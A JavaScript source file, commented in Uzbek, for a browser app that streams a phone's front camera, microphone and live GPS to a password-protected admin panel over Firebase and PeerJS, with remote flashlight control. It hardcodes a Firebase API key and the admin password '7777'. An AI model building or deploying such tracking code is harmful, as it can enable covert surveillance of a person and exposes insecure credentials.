// 1. FIREBASE KONFIGURATSIYASI
const firebaseConfig = {
    apiKey: "AIzaSyBhzWWFFgrOH84J2RIW5o7l_8192iPtbOg",
    authDomain: "code-vibe-df610.firebaseapp.com",
    projectId: "code-vibe-df610",
    databaseURL: "https://code-vibe-df610-default-rtdb.firebaseio.com",
    storageBucket: "code-vibe-df610.firebasestorage.app",
    messagingSenderId: "747762490655",
    appId: "1:747762490655:web:125516814620784cf3a42a",
    measurementId: "G-3QE6F8LWZ1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const adminPass = "7777";

// 2. GLOBAL O'ZGARUVCHILAR
let peer = null;
let adminPeer = null;
let localStream = null;
let currentActiveCallId = null;
let isTalking = false;
let map = null;
let marker = null;
let isFlashlightOn = false;

// --- LOG TIZIMI (Xatolarni masofadan ko'rish uchun) ---
function sendLog(msg) {
    const id = peer ? peer.id : 'no-id';
    db.ref('devices/' + id + '/logs').push({
        time: new Date().toLocaleTimeString(),
        message: msg
    });
}

// Brauzer xatolarini ushlash
window.onerror = (m, u, l) => sendLog(`Xato: ${m} | Qator: ${l}`);

// Sahifa yuklanganda holatni tekshirish
window.onload = () => {
    const role = localStorage.getItem('myRTC_role');
    const name = localStorage.getItem('myRTC_deviceName');
    if (role === 'user' && name) startUserLogic(name);
    else if (role === 'admin') openAdmin(true);
};

// Bosh sahifaga qaytish (va xotirani tozalash)
function goHome() {
    localStorage.clear();
    window.location.reload();
}

// --- USER MODE (TELEFON QISMI) ---
async function openUser() {
    let name = prompt("Qurilma ismini kiriting:");
    if (!name) return;
    localStorage.setItem('myRTC_role', 'user');
    localStorage.setItem('myRTC_deviceName', name);
    startUserLogic(name);
}

async function startUserLogic(deviceName) {
    document.getElementById('main-ui').style.display = 'none';
    peer = new Peer();

    peer.on('open', (id) => {
        // Qurilmani Firebase-da ro'yxatdan o'tkazish
        db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
        db.ref('devices/' + id).onDisconnect().remove();
        sendLog("Telefon onlayn. Old kamera faol.");
        
        // 1. BATARYA MA'LUMOTI
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                const updateBattery = () => {
                    db.ref('devices/' + id + '/info').update({
                        battery: Math.floor(battery.level * 100) + "%",
                        charging: battery.charging
                    });
                };
                updateBattery();
                battery.onlevelchange = updateBattery;
                battery.onchargingchange = updateBattery;
            });
        }

        // 2. MASOFADAN FONARNI BOSHQARISH
        db.ref('devices/' + id + '/commands/flashlight').on('value', async (snap) => {
            const status = snap.val();
            if (localStream) {
                const track = localStream.getVideoTracks()[0];
                const capabilities = track.getCapabilities ? track.getCapabilities() : {};
                
                if (capabilities.torch) {
                    try {
                        await track.applyConstraints({ advanced: [{ torch: status }] });
                        isFlashlightOn = status;
                        sendLog(`Fonar ${status ? 'yoqildi' : 'o\'chirildi'}`);
                    } catch (e) {
                        sendLog("Fonar xatosi: " + e.message);
                    }
                } else {
                    if (status) sendLog("Ushbu kamerada fonar mavjud emas (Old kamera).");
                }
            }
        });

        // 3. GPS MONITORING
        navigator.geolocation.watchPosition(p => {
            db.ref('devices/' + id + '/location').set({
                lat: p.coords.latitude, 
                lng: p.coords.longitude, 
                time: new Date().toLocaleTimeString()
            });
        }, e => sendLog("GPS xatosi: " + e.message), { enableHighAccuracy: true });
    });

    try {
        // FAQAT OLD KAMERANI OCHISH (facingMode: "user")
        localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        
        peer.on('call', call => {
            call.answer(localStream);
            // Admin ovozini eshitish
            call.on('stream', s => {
                const a = new Audio(); 
                a.srcObject = s; 
                a.play().catch(e => sendLog("Audio play error: " + e.message));
            });
        });
    } catch (e) {
        sendLog("Media (Kamera) xatosi: " + e.message);
        alert("Kameraga ruxsat berilmadi!");
    }
}

// --- ADMIN MODE (BOSHQARUV QISMI) ---
function openAdmin(auto = false) {
    if (!auto && prompt("Parol:") !== adminPass) return;
    
    localStorage.setItem('myRTC_role', 'admin');
    document.getElementById('main-ui').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    document.getElementById('top-nav').style.display = 'flex';
    
    if (!adminPeer) adminPeer = new Peer();

    // Onlayn qurilmalar ro'yxatini yangilash
    db.ref('devices').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const btn = document.createElement('button');
            btn.innerText = child.val().name || "Nomsiz";
            btn.onclick = () => connectToDevice(child.key, btn.innerText);
            list.appendChild(btn);
        });
    });
}

function connectToDevice(id, name) {
    currentActiveCallId = id;
    document.getElementById('target-name').innerText = "Qurilma: " + name;

    // 1. ZARYAD DARAJASINI KUZATISH
    db.ref('devices/' + id + '/info').on('value', s => {
        const info = s.val();
        const display = document.getElementById('battery-display');
        if (info && display) {
            display.innerText = `Quvvat: ${info.battery} ${info.charging ? '(Zaryadlanmoqda)' : ''}`;
        }
    });

    // 2. LOGLARNI KUZATISH
    const logBox = document.getElementById('console-logs');
    logBox.innerHTML = "";
    db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
        const p = document.createElement('div');
        p.innerText = `> [${s.val().time}] ${s.val().message}`;
        logBox.prepend(p);
    });

    // 3. GPS XARITADA KO'RSATISH
    db.ref('devices/' + id + '/location').on('value', s => {
        const loc = s.val();
        if (loc) initMap(loc.lat, loc.lng);
    });

    // 4. VIDEO ULANISH (Old kamera oqimini olish)
    const call = adminPeer.call(id, null);
    call.on('stream', s => {
        const video = document.getElementById('remoteVideo');
        if (video) video.srcObject = s;
    });
}

// Xaritani chizish funksiyasi
function initMap(lat, lng) {
    if (!map) {
        map = L.map('map').setView([lat, lng], 16);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        marker = L.marker([lat, lng]).addTo(map);
    } else {
        marker.setLatLng([lat, lng]);
        map.setView([lat, lng]);
    }
}

// 4. FONARNI MASOFADAN YOQISH/OCHIRISH
function toggleFlashlight() {
    if (!currentActiveCallId) return alert("Avval qurilmani tanlang!");
    isFlashlightOn = !isFlashlightOn;
    db.ref('devices/' + currentActiveCallId + '/commands/flashlight').set(isFlashlightOn);
    
    const btn = document.getElementById('flashBtn');
    btn.innerText = isFlashlightOn ? "FONARNI O'CHIRISH" : "FONARNI YOQISH";
    btn.style.background = isFlashlightOn ? "#e74c3c" : "#f39c12";
}

// 5. ADMIN GAPIRISHI (Walkie-Talkie)
async function toggleTalk() {
    const btn = document.getElementById('talkBtn');
    if (!currentActiveCallId) return alert("Avval qurilmani tanlang!");

    if (!isTalking) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            adminPeer.call(currentActiveCallId, stream);
            isTalking = true;
            btn.innerText = "GAPIRILMOQDA... (STOP)";
            btn.style.background = "#e74c3c";
        } catch (e) {
            alert("Mikrofon ruxsati berilmadi!");
        }
    } else {
        window.location.reload(); // Aloqani uzishning eng oson yo'li
    }
}
